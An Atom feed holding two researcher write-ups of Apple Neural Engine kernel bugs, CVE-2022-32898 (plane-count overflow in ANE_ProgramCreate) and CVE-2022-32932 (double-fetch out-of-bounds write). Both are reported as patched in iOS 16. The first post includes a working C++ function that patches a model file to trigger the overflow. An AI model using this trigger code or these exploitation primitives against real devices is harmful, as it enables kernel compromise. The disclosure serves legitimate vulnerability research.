<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-11-24T20:28:43+04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0x36.github.io</title><subtitle></subtitle><entry><title type="html">CVE-2022-32898: ANE_ProgramCreate() multiple kernel memory corruption</title><link href="http://localhost:4000/CVE-2022-32898/" rel="alternate" type="text/html" title="CVE-2022-32898: ANE_ProgramCreate() multiple kernel memory corruption" /><published>2022-11-23T00:00:00+04:00</published><updated>2022-11-23T00:00:00+04:00</updated><id>http://localhost:4000/ANE_ProgramCreate-memory-corruptions</id><content type="html" xml:base="http://localhost:4000/CVE-2022-32898/"><![CDATA[<h2 id="intro">Intro:</h2>
<p>While reverse-engineering the process of which the Apple Neural Engine loads a model in the kernel level, I identified two interesting memory corruption vulnerabilities in the code responsible for processing the neural network features in <code class="language-plaintext highlighter-rouge">H11ANEIn::ANE_ProgramCreate_gated()</code>. These kind of vulnerabilities, in my opinion, are easy to find when manually auditing the kernel driver, but nearly impossible to catch with fuzzers unless you build something incredibly sophisticated.</p>

<h2 id="analysis">Analysis:</h2>
<hr />

<p>The <code class="language-plaintext highlighter-rouge">ZinComputeProgramGetNamesFromMultiPlaneLinear()</code> and <code class="language-plaintext highlighter-rouge">ZinComputeProgramGetNamesFromMultiPlaneTiledCompressed()</code> functions are both responsible for parsing the procedure input and output, or more precisely, the <code class="language-plaintext highlighter-rouge">LC_THREAD</code> command with thread flavor 2 (<code class="language-plaintext highlighter-rouge">ane_bind_state</code>) whose <code class="language-plaintext highlighter-rouge">binding_type_info</code> value is 4 and 5.</p>

<p>From what I can tell, <code class="language-plaintext highlighter-rouge">binding_type_info = 4</code> means that a procedure’s input has more than one plane, and <code class="language-plaintext highlighter-rouge">binding_type_info = 5</code> means that the input not only has more than one plane but is also compressed.</p>

<p>The <code class="language-plaintext highlighter-rouge">ZinComputeProgramGetNamesFromMultiPlaneLinear()</code> function for example takes 5 arguments: a load command pointer, a thread binding pointer, and three extra output arguments. The last output argument <code class="language-plaintext highlighter-rouge">planes</code> is an array that will hold planes, or kernel pointers, whose contents are controlled by the user, and the last argument <code class="language-plaintext highlighter-rouge">planeCount</code> will indicate how many planes (or kernel pointers) were copied into <code class="language-plaintext highlighter-rouge">planes</code> from the <code class="language-plaintext highlighter-rouge">model.hwx</code> file. The following is the function definition:</p>

<p><img src="/img/CVE-2022-32898/image1.png" alt="Untitled" /></p>

<p>Due to the lack of validation of how many planes a model can supply, kernel pointers could be written outside the bounds of the <code class="language-plaintext highlighter-rouge">planes</code> array, potentially leading to a many interesting memory corruption scenarios.</p>

<h3 id="turning-the-memory-corruption-to-stack-overflow">Turning the memory corruption to stack overflow:</h3>
<p>The <code class="language-plaintext highlighter-rouge">planes</code> array is a stack variable located in <code class="language-plaintext highlighter-rouge">H11ANEIn::ANE_ProgramCreate_gated()</code>, and by overflowing this variable (which is supposed to hold multiple planes up to 4 elements) with more than 4 planes, other stack variables could be corrupted as well, which could lead to other issues such as type-confusion since the overwriting kernel pointers are completely under user control.</p>

<p>Obviously, overflowing the <code class="language-plaintext highlighter-rouge">planes</code> array with too much entries would likely overwrite the stack cookie as well as the saved old stack frame pointer, resulting in a kernel panic. Fortunately, the total number of planes is entirely within the control of the given model, thus we could corrupt several stack variables without affecting those sensitive areas of the stack.</p>

<h2 id="turning-the-memory-corruption-to-heap-overflow">Turning the memory corruption to heap overflow:</h2>
<p>Another interesting scenario, and as illustrated in the image below, it is possible to overflow two heap objects: <code class="language-plaintext highlighter-rouge">H11ANEProgramBindingInfo</code> (at line 528) and <code class="language-plaintext highlighter-rouge">H11ANEProgramCreateArgsStructOutput</code> (at line 533).</p>

<p><img src="/img/CVE-2022-32898/image2.png" alt="Untitled" /></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">H11ANEProgramBindingInfo</span>
<span class="p">{</span>
        <span class="k">struct</span> <span class="p">{</span>
                <span class="kt">uint32_t</span> <span class="n">field_0</span><span class="p">;</span>
                <span class="kt">char</span> <span class="n">names</span><span class="p">[</span><span class="mi">8</span><span class="p">][</span><span class="mi">512</span><span class="p">];</span>
                <span class="kt">uint32_t</span> <span class="n">field_1004</span><span class="p">;</span>
                <span class="kt">char</span> <span class="o">*</span><span class="n">procedure_name</span><span class="p">;</span>
        <span class="p">}</span> <span class="n">inputs</span><span class="p">[</span><span class="mi">255</span><span class="p">],</span> <span class="n">outputs</span><span class="p">[</span><span class="mi">255</span><span class="p">];</span>

<span class="p">};</span>
</code></pre></div></div>

<p>The structure definition of <code class="language-plaintext highlighter-rouge">H11ANEProgramCreateArgsStructOutput</code> is shown above, and  corrupting it could result in the following crashes:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"panicString" : "panic(cpu 4 caller 0xfffffe00112e6184): Kernel data abort. at pc 0xfffffe0010a8a48c, lr 0x03effe0011b1b47c (saved state: 0xfffffe6089dca980)
  x0:  0x1122334411223344 x1:  0xfffffe3000ecff20  x2:  0x0000000000000040  x3:  0x0000000000000000
  x4:  0x0000000000000000 x5:  0x0000000000000000  x6:  0x00000000000000e8  x7:  0x0000000000000830
  x8:  0xfffffe608949c000 x9:  0xfffffe24cec0d1b0  x10: 0xfffffe24cd7d4010  x11: 0xfffffe1667fa93e0
  x12: 0x0000000000000001 x13: 0x0000000000000858  x14: 0xfffffe3000ed0760  x15: 0x00292a20736d6172
  x16: 0x5bd9fe0010a8a470 x17: 0xfffffe0013ad55d8  x18: 0x0000000000000000  x19: 0x0000000000000000
  x20: 0x0000000000000001 x21: 0xfffffe1b33ee3860  x22: 0xfffffe299a621a00  x23: 0xfffffe2999c72208
  x24: 0xfffffe3000ec0000 x25: 0x00000000e00002d1  x26: 0xfffffe608949c000  x27: 0xfffffe60895a2054
  x28: 0xfffffe6089dcb850 fp:  0xfffffe6089dcacd0  lr:  0x03effe0011b1b47c  sp:  0xfffffe6089dcacd0
  pc:  0xfffffe0010a8a48c cpsr: 0x00401208         esr: 0x96000004          far: 0x1122334411223344
  
</code></pre></div></div>

<h1 id="trigger-the-vulnerability">Trigger the vulnerability:</h1>

<p>What makes these vulnerabilities interesting is that it doesn’t require you to interact directly with the kernel, in other words, no need to open a UserClient connection, you simply need to compile (or craft) a malicious model and let <code class="language-plaintext highlighter-rouge">aned</code> load it on your behalf.</p>

<p>As you may know, to load any model via <code class="language-plaintext highlighter-rouge">aned</code>, the model must be compiled by the <code class="language-plaintext highlighter-rouge">ANECompilerService</code> system service or signed by Apple. in other words, the app must provide a <code class="language-plaintext highlighter-rouge">.mlmodelc</code> directory to <code class="language-plaintext highlighter-rouge">aned</code> which will then request <code class="language-plaintext highlighter-rouge">ANECompilerService</code> to compile it to <code class="language-plaintext highlighter-rouge">model.hwx</code> using two frameworks called <code class="language-plaintext highlighter-rouge">Espresso</code> and <code class="language-plaintext highlighter-rouge">ANECompiler</code>. 
If you don’t know what I’m talking about, you’re welcome to take a look at #POC2022 slides <a href="https://github.com/0x36/weightBufs/blob/main/attacking_ane_poc2022.pdf">here</a> where I gave a basic overview of how <code class="language-plaintext highlighter-rouge">aned</code> works. In addition, you can get more details about the compilation process in <a href="https://twitter.com/wish_wu">Wish Wu</a>’s excellent <a href="https://www.youtube.com/watch?v=1wvBDUnPNEo&amp;ab_channel=BlackHat">BlackHat talk</a> regarding his research on ANE as well as <a href="https://github.com/antgroup-arclab/ANETools">his great tool</a> that exactly mimics what <code class="language-plaintext highlighter-rouge">ANECompilerService</code> does.</p>

<p>In our case here, we need a <code class="language-plaintext highlighter-rouge">model.hwx</code> with a procedure whose input (or output) supports multiple planes. Unfortunately, no such model is available in the <code class="language-plaintext highlighter-rouge">mlmodel</code>, <code class="language-plaintext highlighter-rouge">mlmodelc</code> or <code class="language-plaintext highlighter-rouge">mlpackage</code> format, and only few models in <code class="language-plaintext highlighter-rouge">hwx</code> format are provided by Apple. Inspecting these <code class="language-plaintext highlighter-rouge">hwx</code> models revealed that they are using some weird/undocumented neural network operations that don’t exist in the open source <code class="language-plaintext highlighter-rouge">coremltools</code> library code base, hinting that these network layers are likely for internal usage only. However, the implementation of these operations is defined by the <code class="language-plaintext highlighter-rouge">Espresso</code> framework, and some reversing is required to understand  what inputs and outputs they support and how to properly use them as a layer within a neural network. Since the framework is written in C++ with STL, I had no interest in reversing this operation because it’d take forver.</p>

<p>This was main reason that led me to discover <code class="language-plaintext highlighter-rouge">CVE-2022-32845</code> which not only allowed me to avoid reversing this scary framework, but also saved me hunders of hours of studying advanced Machine Learning topics.</p>

<p>So I took a simple <code class="language-plaintext highlighter-rouge">model.hwx</code> and patched one of its <em>LC_THREAD</em> commands to replicate the desired outcome in <code class="language-plaintext highlighter-rouge">ane_bind_state</code>, and then exploited <code class="language-plaintext highlighter-rouge">CVE-2022-32845</code> to trick <code class="language-plaintext highlighter-rouge">aned</code> into loading it as if it was signed by Apple; and that was enough to demostrate the vulnerability to Apple.</p>

<p>The function which patches the model is shown below, and you can borrow some codes from my <a href="https://github.com/0x36/weightBufs/">weightBufs kernel exploit</a> if you want to trigger the vulnerability yourself.</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">patch_hwx</span><span class="p">(</span><span class="k">const</span> <span class="n">mach_header_64</span> <span class="o">*</span><span class="n">mh</span><span class="p">,</span><span class="kt">size_t</span> <span class="n">mh_size</span><span class="p">)</span>
<span class="p">{</span>
        <span class="k">if</span><span class="p">((</span><span class="n">mh</span><span class="o">-&gt;</span><span class="n">magic</span> <span class="o">!=</span> <span class="mh">0xfeedface</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">mh</span><span class="o">-&gt;</span><span class="n">magic</span> <span class="o">!=</span> <span class="mh">0xbeefface</span><span class="p">))</span> <span class="p">{</span>
                <span class="n">dbg</span><span class="p">(</span><span class="s">"[-] Bad Mach-O file </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                <span class="k">return</span> <span class="p">;</span>
        <span class="p">}</span>

        <span class="k">struct</span> <span class="nc">load_command</span> <span class="o">*</span><span class="n">lc</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

        <span class="n">FOR_EACH_COMMAND</span> <span class="p">{</span>

                <span class="k">if</span> <span class="p">(</span><span class="n">lc</span><span class="o">-&gt;</span><span class="n">cmd</span> <span class="o">!=</span> <span class="n">LC_THREAD</span><span class="p">)</span>
                        <span class="k">continue</span><span class="p">;</span>

                <span class="n">dbg</span><span class="p">(</span><span class="s">"LC_THREAD command found </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

                <span class="n">compute_thread_command</span> <span class="o">*</span><span class="kr">thread</span> <span class="o">=</span> <span class="p">(</span><span class="n">compute_thread_command</span> <span class="o">*</span><span class="p">)</span><span class="n">lc</span><span class="p">;</span>
                <span class="n">u32</span> <span class="n">name_off</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                <span class="k">switch</span> <span class="p">(</span><span class="kr">thread</span><span class="o">-&gt;</span><span class="n">flavor</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">case</span> <span class="n">THREAD_BINDING</span><span class="p">:</span> <span class="p">{</span>
                        <span class="n">name_off</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span><span class="p">)((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="kr">thread</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">);</span>
                        <span class="n">dbg</span><span class="p">(</span><span class="s">"Binding Name </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                        <span class="n">compute_thread_binding</span> <span class="o">*</span> <span class="n">bd</span> <span class="o">=</span>
                                <span class="p">(</span><span class="n">compute_thread_binding</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="kr">thread</span><span class="o">-&gt;</span><span class="n">thread_states</span><span class="p">;</span>

                        <span class="n">bd</span><span class="o">-&gt;</span><span class="n">binding_typeinfo</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
                        <span class="n">bd</span><span class="o">-&gt;</span><span class="n">field4</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

                        <span class="n">u32</span> <span class="n">plane_count</span> <span class="o">=</span> <span class="mh">0x30</span><span class="p">;</span>
                        <span class="kt">char</span> <span class="o">*</span><span class="n">buf_start</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">lc</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">;</span>
                        <span class="o">*</span><span class="p">(</span><span class="n">u32</span> <span class="o">*</span><span class="p">)</span> <span class="n">buf_start</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                        <span class="o">*</span><span class="p">(</span><span class="n">u32</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">buf_start</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">=</span> <span class="n">plane_count</span><span class="p">;</span>
                        <span class="kt">char</span> <span class="o">*</span><span class="n">_ptr</span> <span class="o">=</span> <span class="n">buf_start</span> <span class="o">+</span> <span class="mh">0x6C</span><span class="p">;</span>
                        <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                        <span class="kt">uint64_t</span> <span class="n">off</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

                        <span class="k">do</span> <span class="p">{</span>
                                <span class="k">if</span><span class="p">(</span><span class="n">off</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
                                        <span class="n">off</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)(</span><span class="n">_ptr</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">-</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">mh</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8</span> <span class="p">;</span>
                                <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">_ptr</span> <span class="o">=</span> <span class="n">mh_size</span><span class="p">;</span>

                                <span class="n">u64</span> <span class="o">*</span><span class="n">pp</span> <span class="o">=</span> <span class="p">(</span><span class="n">u64</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">_ptr</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
                                <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span><span class="n">k</span><span class="o">++</span><span class="p">)</span>
                                        <span class="n">pp</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1122334411223344</span><span class="p">;</span>
                                <span class="n">_ptr</span> <span class="o">+=</span> <span class="mh">0x68</span><span class="p">;</span>

                        <span class="p">}</span><span class="k">while</span> <span class="p">(</span><span class="n">i</span><span class="o">++</span> <span class="o">&lt;</span> <span class="n">plane_count</span><span class="p">);</span>

                        <span class="n">patched</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>

                        <span class="k">return</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="k">case</span> <span class="n">THREAD_PROCEDURE_OPERATION</span><span class="p">:</span>
                <span class="k">case</span> <span class="n">THREAD_PROCEDURE</span><span class="p">:</span>
                <span class="nl">default:</span>
                        <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="n">dbg</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s"> ProcedureName '%s' </span><span class="se">\n</span><span class="s">"</span><span class="p">,(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="kr">thread</span> <span class="o">+</span> <span class="n">name_off</span><span class="p">);</span>

        <span class="p">}</span>

<span class="p">}</span>
</code></pre></div></div>

<h2 id="the-patch">The patch:</h2>
<hr />
<p>Apple addressed the issue in iOS 16 by introducing some validation checks in both vulnerable functions, limiting the supplied plane count to four entries, as shown below:
<img src="/img/CVE-2022-32898/image3.png" alt="Untitled" /></p>

<p>That’s all for now, see you again soon!</p>]]></content><author><name>Mohamed GHANNAM (@_simo36)</name></author><category term="iOS" /><summary type="html"><![CDATA[Intro: While reverse-engineering the process of which the Apple Neural Engine loads a model in the kernel level, I identified two interesting memory corruption vulnerabilities in the code responsible for processing the neural network features in H11ANEIn::ANE_ProgramCreate_gated(). These kind of vulnerabilities, in my opinion, are easy to find when manually auditing the kernel driver, but nearly impossible to catch with fuzzers unless you build something incredibly sophisticated.]]></summary></entry><entry><title type="html">CVE-2022-32932: ZinComputeProgramUpdateMutables() OOB write due to double fetch issue</title><link href="http://localhost:4000/CVE-2022-32932/" rel="alternate" type="text/html" title="CVE-2022-32932: ZinComputeProgramUpdateMutables() OOB write due to double fetch issue" /><published>2022-11-15T00:00:00+04:00</published><updated>2022-11-15T00:00:00+04:00</updated><id>http://localhost:4000/oob-double-fetch</id><content type="html" xml:base="http://localhost:4000/CVE-2022-32932/"><![CDATA[<h2 id="analysis">Analysis:</h2>

<hr />
<p><code class="language-plaintext highlighter-rouge">H11ANEIn::patchMutableSurface()</code> (reachable from <code class="language-plaintext highlighter-rouge">H11ANEIn::ANE_ProgramSendRequest_gated</code>) is called if the <code class="language-plaintext highlighter-rouge">model.hwx</code> has a mutable procedure and has also <em>initInfo</em> section, I looked for such a model but couldn’t find any, so I ended up patching one of the pre-compiled models and used CVE-2022-32845 to load it. Please keep in mind that CVE-2022-32845 is not required to reach the vulnerable code path from the default app sandbox, it is sufficient to compile a custom mlmodel to achieve the same results.
You can find more details about CVE-2022-32845 in my <a href="https://github.com/0x36/weightBufs/blob/main/attacking_ane_poc2022.pdf">presentation slides</a>.</p>

<p><code class="language-plaintext highlighter-rouge">ZinComputeProgramUpdateMutables()</code> is another function that’s called by <code class="language-plaintext highlighter-rouge">H11ANEIn::patchMutableSurface()</code> and the function prototype is the following:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ZinComputeProgramStatus</span> <span class="kr">__cdecl</span> <span class="nf">ZinComputeProgramUpdateMutables</span><span class="p">(</span>
        <span class="kt">uint64_t</span> <span class="n">procedureId</span><span class="p">,</span>
        <span class="k">const</span> <span class="n">ZinComputeProgramInitInfo</span> <span class="o">*</span><span class="n">init_info</span><span class="p">,</span>
        <span class="k">const</span> <span class="n">ANECMutableProcedureInfo</span> <span class="o">*</span><span class="n">mutable_procedure_info</span><span class="p">,</span>
        <span class="kt">uint64_t</span> <span class="n">mut_procedure_info_size</span><span class="p">,</span>
        <span class="kt">void</span> <span class="o">*</span><span class="n">MUTK_kernel_section</span><span class="p">,</span>
        <span class="kt">uint64_t</span> <span class="n">MUTK_kernel_section_size</span><span class="p">);</span>
</code></pre></div></div>

<ul>
  <li><strong>init_info</strong>: is the <code class="language-plaintext highlighter-rouge">initInfo</code> section that contains a serialized input, you can find the serializer function <a href="https://github.com/0x36/weightBufs/blob/main/exploit/exploit.m#L644">serialize_initinfo_section()</a> in <code class="language-plaintext highlighter-rouge">weightBufs</code> exploit source code.</li>
  <li><strong>mutable_procedure_info</strong> : is a shared IOSurface buffer provided by the attacker, it’s also called <strong>weightsBuffer</strong> in <code class="language-plaintext highlighter-rouge">weightBufs</code> exploit.</li>
  <li><strong>mut_procedure_info_size</strong>: It denotes the size of the <strong>mutable_procedure_info</strong> surface buffer.</li>
  <li><strong>MUTK_kernel_section</strong>: (or <code class="language-plaintext highlighter-rouge">MUTK</code>) It’s a mapping buffer of an IOSurface object that’s created by the kernel during program loading phase.</li>
  <li><strong>MUTK_kernel_section_size</strong>:  is the size of the mutable kernel section.</li>
</ul>

<p><img src="/img/double_fetch/image1.png" alt="Untitled" /></p>

<p>The loop <strong>88-92</strong> calculates the <code class="language-plaintext highlighter-rouge">MutableWeight</code> object count within the <strong>mutable_procedure_info</strong> object, then calculates the allocation size of the <code class="language-plaintext highlighter-rouge">MutableWeight</code> array at <strong>93</strong>. 
After that, the <code class="language-plaintext highlighter-rouge">ANECMutableWeight</code> array of objects is allocated at <strong>100</strong>, then populated with the appropriate weight buffer/size pair in the loop <strong>111-127</strong> by <code class="language-plaintext highlighter-rouge">ANECGetMutableWeight()</code>.</p>

<p><code class="language-plaintext highlighter-rouge">ANECGetMutableOperationInfo()</code> returns an object <code class="language-plaintext highlighter-rouge">opsInfo</code> from our shared memory:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">opsInfo</span> <span class="o">*</span><span class="kr">__fastcall</span> <span class="nf">ANECGetMutableOperationInfo</span><span class="p">(</span><span class="k">const</span> <span class="n">ANECMutableProcedureInfo</span> <span class="o">*</span><span class="n">MutableProcedureInfo</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">id</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">weight_buffer_size</span><span class="p">;</span> <span class="c1">// w8</span>
  <span class="n">opsInfo</span> <span class="o">*</span><span class="n">opInfo</span><span class="p">;</span> <span class="c1">// x0</span>

  <span class="n">weight_buffer_size</span> <span class="o">=</span> <span class="n">MutableProcedureInfo</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">weight_buffer_size</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">weight_buffer_size</span> <span class="p">)</span>
    <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">opInfo</span> <span class="o">=</span> <span class="p">(</span><span class="n">opsInfo</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">MutableProcedureInfo</span> <span class="o">+</span> <span class="n">MutableProcedureInfo</span><span class="o">-&gt;</span><span class="n">wb_offsets</span><span class="p">[</span><span class="n">id</span><span class="p">]);</span>
  <span class="k">while</span> <span class="p">(</span> <span class="n">opInfo</span><span class="o">-&gt;</span><span class="n">op_index</span> <span class="o">!=</span> <span class="n">id</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!--</span><span class="n">weight_buffer_size</span> <span class="p">)</span>
      <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">opInfo</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">ANECGetMutableWeight</code> pseudo-code is the following:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="nf">ANECGetMutableWeight</span><span class="p">(</span>
        <span class="k">const</span> <span class="n">ANECMutableProcedureInfo</span> <span class="o">*</span><span class="n">procedure_info</span><span class="p">,</span>
        <span class="n">weightInfo</span> <span class="o">*</span><span class="n">a2</span><span class="p">,</span>
        <span class="n">ANECMutableWeight</span> <span class="o">*</span><span class="n">a3</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">uint64_t</span> <span class="n">wi_size</span><span class="p">;</span> <span class="c1">// x9</span>

  <span class="n">wi_size</span> <span class="o">=</span> <span class="n">a2</span><span class="o">-&gt;</span><span class="n">wi_size</span><span class="p">;</span>
  <span class="n">a3</span><span class="o">-&gt;</span><span class="n">_weightBuf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">procedure_info</span> <span class="o">+</span> <span class="n">a2</span><span class="o">-&gt;</span><span class="n">wi_off</span><span class="p">;</span>
  <span class="n">a3</span><span class="o">-&gt;</span><span class="n">_weightBufSize</span> <span class="o">=</span> <span class="n">wi_size</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">ANECGetMutableWeightInfo</code> pseudo-code is the following:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">weightInfo</span> <span class="o">*</span><span class="kr">__fastcall</span> <span class="nf">ANECGetMutableWeightInfo</span><span class="p">(</span>
        <span class="k">const</span> <span class="n">ANECMutableProcedureInfo</span> <span class="o">*</span><span class="n">MutableProcedureInfo</span><span class="p">,</span>
        <span class="n">opsInfo</span> <span class="o">*</span><span class="n">a2</span><span class="p">,</span>
        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a3</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">a2</span><span class="o">-&gt;</span><span class="n">op_count</span> <span class="o">&lt;=</span> <span class="n">a3</span> <span class="p">)</span>
    <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="k">else</span>
    <span class="k">return</span> <span class="p">(</span><span class="n">weightInfo</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">MutableProcedureInfo</span> <span class="o">+</span> <span class="n">a2</span><span class="o">-&gt;</span><span class="n">op_offsets</span><span class="p">[</span><span class="n">a3</span><span class="p">]);</span>
<span class="p">}</span>
</code></pre></div></div>
<p>I already described the format of the <code class="language-plaintext highlighter-rouge">ANECMutableProcedureInfo</code> in <a href="https://github.com/0x36/weightBufs/blob/main/attacking_ane_poc2022.pdf">“Attacking Apple’s Neural Engine” slides</a>, so feel free to read it if you haven’t already. The structure definition can be found in weightBufs exploit at <a href="https://github.com/0x36/weightBufs/blob/main/exploit/aneProgram.h#L190">‘aneProgram.h’</a>.</p>

<h2 id="vulnerability">Vulnerability:</h2>
<hr />

<p>If you’ve noticed, <code class="language-plaintext highlighter-rouge">ANECGetMutableOperationInfo()-&gt;op_count</code> is fetched twice: once to calculate the size in order to allocate the <code class="language-plaintext highlighter-rouge">ANECMutableWeight</code> array, and once to populate this array.</p>

<p>Because the <strong>mutable_procedure_info</strong> buffer is a shared memory, an attacker <strong>could use a separate thread to change the value of <code class="language-plaintext highlighter-rouge">opsInfo-&gt;op_count</code> between the first and the second usages</strong>, resulting in a size mismatch that will lead to an interesting OOB write in either a kalloc var zone, kheap defaul or the kernel map.</p>

<p>The vulnerability can be used in many interesting ways. For example, an attacker could set <code class="language-plaintext highlighter-rouge">total_count = 0x1000;</code> at line <strong>93</strong>, then increase <code class="language-plaintext highlighter-rouge">opsInfo-&gt;count</code> to something larger, causing data to be copied out of bounds at <code class="language-plaintext highlighter-rouge">ANECGetMutableWeight()</code> .</p>

<p>The kernel will panic at the instruction shown below if the OOB write has reached an unmapped memory area:</p>

<pre><code class="language-txt">com.apple.driver.AppleH11ANEInterface:__text:FFFFFE0008913D08                 EXPORT _ANECGetMutableWeight
com.apple.driver.AppleH11ANEInterface:__text:FFFFFE0008913D08 _ANECGetMutableWeight                   ; CODE XREF: _ZinComputeProgramUpdateMutables+270↓p
com.apple.driver.AppleH11ANEInterface:__text:FFFFFE0008913D08                 LDP             X8, X9, [X1,#8]
com.apple.driver.AppleH11ANEInterface:__text:FFFFFE0008913D0C                 ADD             X8, X0, X8
com.apple.driver.AppleH11ANEInterface:__text:FFFFFE0008913D10                 STP             X8, X9, [X2] // &lt;---- Kernel panic 
com.apple.driver.AppleH11ANEInterface:__text:FFFFFE0008913D14                 RET
</code></pre>

<p>This bug provides a strong primitive in that it writes two 64-bit values: a kernel address pointing to our user shared buffer and a (semi-)arbitrary 64-bit value.</p>

<h2 id="proof-of-concept">Proof-Of-Concept:</h2>
<p>The proof-of-concept is left as an exercise for the reader. However, <code class="language-plaintext highlighter-rouge">weightBufs</code> exploit includes everything required to reach the vulnerable code path. Good Luck :-).</p>]]></content><author><name>Mohamed GHANNAM (@_simo36)</name></author><category term="iOS" /><summary type="html"><![CDATA[Analysis:]]></summary></entry></feed>